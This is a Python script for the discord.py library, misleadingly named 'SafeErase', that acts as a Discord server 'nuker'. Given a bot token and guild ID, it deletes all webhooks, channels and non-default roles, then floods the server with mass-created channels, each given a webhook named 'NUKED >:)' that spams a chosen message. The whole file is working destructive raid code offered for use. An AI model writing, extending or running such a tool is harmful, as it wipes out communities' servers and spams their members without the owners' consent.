import discord

intents = discord.Intents.default()
intents.guilds = True
client = discord.Client(intents=intents)


class SafeErase:
    def __init__(self, token: str, guild_id: int):
        self.token = token
        self.guild_id = guild_id

    async def full(self):
        guild = await client.fetch_guild(self.guild_id)
        # Delete all webhooks first (at the start)
        webhooks = await guild.webhooks()
        for webhook in webhooks:
            try:
                await webhook.delete()
                print(f"Deleted >> {webhook.name}")
            except discord.NotFound:
                pass  # already gone
            except discord.HTTPException as e:
                print(f"Could not delete {webhook.name}: {e}")
        channels = await guild.fetch_channels()
        for channel in channels:
            await channel.delete()
            print(f"{channel.name} Has Been Deleted")
        for role in guild.roles:
            if role.is_default():
                continue  # @everyone cannot be deleted
            try:
                await role.delete()
                print(f"Deleted {role.name}")
            except discord.HTTPException as e:
                print(f"Could not delete {role.name}: {e}")
        amount = int(input("Enter Amount of Channels >> "))
        names = input("Enter NAME for Channels >> ")
        for i in range(amount):
            await guild.create_text_channel(name=names)
            print(f"Created {i+1} Channels")
        channels = await guild.fetch_channels()
        created_webhooks = []
        for channel in channels:
            webhook = await channel.create_webhook(name="NUKED >:)")
            created_webhooks.append(webhook)
            print(f"Created Webhook IN: {channel.name}")

        # Send a message from every webhook
        webhook_message = input("Enter message to send from each webhook (or Enter to skip): ").strip()
        if webhook_message:
            for webhook in created_webhooks:
                try:
                    await webhook.send(webhook_message)
                    print(f"Sent via webhook: {webhook.name}")
                except discord.HTTPException as e:
                    print(f"Failed to send via webhook: {e}")

        await client.close()
        
    def run_all(self):
        @client.event
        async def on_ready():
            print("Logged in Successfully...")
            await self.full()
        client.run(self.token)

if __name__ == '__main__':
    token = input("Enter TOKEN >> ")
    guild_id = int(input("Enter GUILD ID >> "))
    nk = SafeErase(token, guild_id)
    nk.run_all()
